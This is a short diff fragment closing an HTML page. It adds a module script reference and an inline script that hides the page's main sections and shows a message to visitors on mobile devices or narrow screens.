+    <script type="module" src="script3.js"></script>
+
+    <script>
+      function isMobile() {
+        return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+      }
+    
+      window.onload = function() {
+        if (isMobile() || window.innerWidth < 1024) {
+          // Show the message and block the site
+          document.getElementById("mobileMessage").classList.remove("hidden");
+          document.querySelector("main").style.display = "none";
+          document.querySelector("aside").style.display = "none";
+          document.querySelector("header").style.display = "none";
+          document.querySelector("footer").style.display = "none";
+        }
+      }
+    </script>
+    
+</body>
+</html>
+
+
+
+
+
